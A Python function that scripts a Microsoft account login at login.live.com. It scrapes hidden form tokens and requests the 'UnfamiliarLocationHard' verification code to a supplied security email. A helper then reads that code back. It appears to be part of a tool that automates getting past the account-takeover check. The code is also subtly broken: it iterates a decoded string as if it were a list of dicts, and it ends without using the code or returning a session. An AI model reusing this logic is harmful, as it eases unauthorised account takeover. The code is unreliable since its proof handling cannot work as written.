from views.utils.securing.getEmailCode import getEmailCode
from views.utils.securing.getLiveData import getLiveData
from urllib.parse import unquote
import httpx
import re

async def loginPWD(session: httpx.AsyncClient, email: str, security_email: str, password: str) -> httpx.AsyncClient:

    data = getLiveData()

    loginData = await session.post(
        url = data["urlPost"],
        headers = {
            "host": "login.live.com",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Priority": "u=0, i"
        },
        data = {
            "ps": 2,
            "PPFT": data["ppft"],
            "PPSX": "Pass",
            "login": email,
            "loginfmt": email,
            "type": 11,
            "passwd": password
        }
    )

    action = re.search(r'action="([^"]+)"', loginData.text).group(1)
    ipt = unquote(re.search(r'name="ipt"[^>]+value="([^"]+)"', loginData.text).group(1))
    pprid = re.search(r'name="pprid"[^>]+value="([^"]+)"', loginData.text).group(1)

    identityConfirm = await session.post(
        url = action,
        headers = {
            "host": "account.live.com",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Priority": "u=0, i"
        },
        data = {
            "pprid": pprid,
            "ipt": ipt
        }
    )
    
    raw = re.search(r'"rawProofList"\s*:\s*"(.*?)"(?=,|\})', identityConfirm.text).group(1).encode().decode("unicode_escape")
    epid = next(
        (p["epid"] for p in raw if p.get("type") == "Email" and p.get("epid")),
        raw[0]["epid"]
    )

    api_canary = re.search(r'"apiCanary"\s*:\s*"([^"]+)"', identityConfirm.text).group(1).encode().decode("unicode_escape")
    eipt = re.search(r'"eipt"\s*:\s*"([^"]+)"', identityConfirm.text).group(1).encode().decode('unicode_escape')
    uaid = re.search(r'"uaid"\s*:\s*"([^"]+)"', identityConfirm.text).group(1)

    await session.post(
        url = "https://account.live.com/api/Proofs/SendOtt", 
        headers = {
            "Content-type": "application/json",
            "Accept": "application/json",
            "hpgid": "200368",
            "scid": "100166",
            "canary": api_canary,
            "eipt": eipt,
            "uaid": uaid,
            "uiflvr": "1001",
            "hpgact": "0"
        },
        json = {
            "token": "",
            "purpose": "UnfamiliarLocationHard",
            "epid": epid,
            "autoVerification": False,
            "autoVerificationFailed": False,
            "confirmProof": security_email,
            "uaid": uaid,
            "uiflvr": 1001,
            "scid": 100166,
            "hpgid": 200368
        }
    )

    code = getEmailCode(security_email)